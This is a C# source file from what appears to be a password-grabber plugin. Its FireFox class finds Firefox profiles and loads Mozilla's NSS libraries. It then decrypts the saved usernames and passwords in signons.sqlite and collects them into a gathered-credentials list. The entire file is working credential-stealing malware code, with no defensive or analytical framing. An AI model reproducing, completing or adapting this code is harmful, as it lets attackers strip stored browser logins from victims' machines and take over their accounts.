using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Data;
using System.Text;
using System.Threading;

namespace Plugin_PwdGrabber
{
    class FireFox
    {
        public static void Start()
        {
            string SignonFile = "";

            string MozillaPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + @"\Mozilla Firefox\";
            string ProfilePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Mozilla\Firefox\Profiles";

            foreach (string SubFolder in Directory.GetDirectories(ProfilePath))
            {
                foreach (string SingleFile in Directory.GetFiles(SubFolder, "*.sqlite"))
                {
                    if (SingleFile.Contains("signons.sqlite"))
                    {
                        SignonFile = SingleFile;
                        NSS_Init(SubFolder, MozillaPath);
                    }
                }
            }

            SQLiteWrapper NewDb = new SQLiteWrapper(SignonFile);
            NewDb.ReadTable("moz_logins");

            for (int i = 0; i <= NewDb.GetRowCount() - 1; i++)
            {
                string Host = NewDb.GetValue(i, "hostname");
                string FormUrl = NewDb.GetValue(i, "formSubmitURL");
                string Username = Decrypt(NewDb.GetValue(i, "encryptedUsername"));
                string Password = Decrypt(NewDb.GetValue(i, "encryptedPassword"));

                UserDataManager.GatheredCredentials.Add(new Credential("FireFox", Host, Username, Password, FormUrl));
            }
        }

        public static string Decrypt(string CipherText)
        {
            StringBuilder CipherBuilder = new StringBuilder(CipherText);
            new TSECItem();
            TSECItem tSecDec = new TSECItem();
            byte[] bvRet;
            long KeySlot = 0;

            KeySlot = PK11_GetInternalKeySlot();
            PK11_Authenticate(KeySlot, true, 0);

            int hi2 = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, CipherBuilder, CipherBuilder.Length);
            TSECItem item = (TSECItem)Marshal.PtrToStructure(new IntPtr(hi2), typeof(TSECItem));
            if (PK11SDR_Decrypt(ref item, ref tSecDec, 0) == 0)
            {
                if (tSecDec.SECItemLen != 0)
                {
                    bvRet = new byte[tSecDec.SECItemLen];
                    Marshal.Copy(new IntPtr(tSecDec.SECItemData), bvRet, 0, tSecDec.SECItemLen);
                    return Encoding.ASCII.GetString(bvRet);
                }
                return "Error";
            }
            else
                return "Error";
        }

        public static long NSS_Init(string ProfileDir, string MozillaPath)
        {
            LoadLibrary(MozillaPath + "mozglue.dll");
            LoadLibrary(MozillaPath + "nspr4.dll");
            LoadLibrary(MozillaPath + "plc4.dll");
            LoadLibrary(MozillaPath + "plds4.dll");
            LoadLibrary(MozillaPath + "nssutil3.dll");

            NSS3 = LoadLibrary(MozillaPath + "nss3.dll");
            IntPtr pProc = GetProcAddress(NSS3, "NSS_Init");
            DLLFunctionDelegate dll = (DLLFunctionDelegate)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate));
            return dll(ProfileDir);
        }

        #region ManagedMethods
        public static long PK11_GetInternalKeySlot()
        {
            IntPtr pProc = GetProcAddress(NSS3, "PK11_GetInternalKeySlot");
            DLLFunctionDelegate2 dll = (DLLFunctionDelegate2)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate2));
            return dll();
        }

        public static long PK11_Authenticate(long slot, bool loadCerts, long wincx)
        {
            IntPtr pProc = GetProcAddress(NSS3, "PK11_Authenticate");
            DLLFunctionDelegate3 dll = (DLLFunctionDelegate3)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate3));
            return dll(slot, loadCerts, wincx);
        }

        public static int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
        {
            IntPtr pProc = GetProcAddress(NSS3, "NSSBase64_DecodeBuffer");
            DLLFunctionDelegate4 dll = (DLLFunctionDelegate4)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate4));
            return dll(arenaOpt, outItemOpt, inStr, inLen);
        }

        public static int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
        {
            IntPtr pProc = GetProcAddress(NSS3, "PK11SDR_Decrypt");
            DLLFunctionDelegate5 dll = (DLLFunctionDelegate5)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate5));
            return dll(ref data, ref result, cx);
        }
        #endregion

        #region Structs
        public class SHITEMID
        {
            public static long cb;
            public static byte[] abID;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct TSECItem
        {
            public int SECItemType;
            public int SECItemData;
            public int SECItemLen;
        }
        #endregion

        #region DllImports
        [DllImport("kernel32.dll")]
        private static extern IntPtr LoadLibrary(string dllFilePath);
        static IntPtr NSS3;
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long DLLFunctionDelegate(string configdir);
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long DLLFunctionDelegate2();
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long DLLFunctionDelegate3(long slot, bool loadCerts, long wincx);
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int DLLFunctionDelegate4(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int DLLFunctionDelegate5(ref TSECItem data, ref TSECItem result, int cx);
        #endregion
    }
}
